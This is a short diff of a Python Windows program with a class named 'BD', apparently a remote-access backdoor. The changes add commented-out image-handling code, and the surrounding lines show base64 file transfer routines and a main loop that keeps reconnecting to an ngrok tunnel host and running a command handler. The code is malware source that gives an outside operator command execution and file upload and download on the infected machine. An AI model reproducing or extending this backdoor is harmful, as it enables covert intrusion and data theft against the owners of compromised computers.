@@ -18,7 +18,8 @@ import win32con
 import win32process
 import random
 import shutil
-
+# from PIL import Image
+# from io import BytesIO
 
 class BD:
     def __init__(self, ip, port):
@@ -175,6 +176,10 @@ class BD:
                 with open(path, "rb") as file:
                     image_data = file.read()
                 return base64.b64encode(image_data).decode()
+                # img = Image.open(path)
+                # buffer = BytesIO()
+                # img.save(buffer, format=img.format, optimize=True, quality=100)
+                # return base64.b64encode(buffer.getvalue()).decode()
             else:
                 # สำหรับไฟล์ทั่วไป
                 with open(path, "rb") as file:
@@ -189,6 +194,10 @@ class BD:
                 # สำหรับไฟล์รูปภาพ ใช้ binary mode
                 with open(path, "wb") as file:
                     file.write(base64.b64decode(content))
+                # img = Image.open(path)
+                # buffer = BytesIO()
+                # img.save(buffer, format=img.format, optimize=True, quality=100)
+                # return base64.b64encode(buffer.getvalue()).decode()
             else:
                 # สำหรับไฟล์ทั่วไป
                 with open(path, "wb") as file:
@@ -641,7 +650,7 @@ if __name__ == "__main__":
         while True:
             try:
                 server_bd = BD("0.tcp.ap.ngrok.io", 17092)
-                # server_bd = BD("192")
+                # server_bd = BD("192.168.1.101", 5555)
                 server_bd.run_cmd()
             except Exception as e:
                 print(f"[-] Error: {str(e)}")
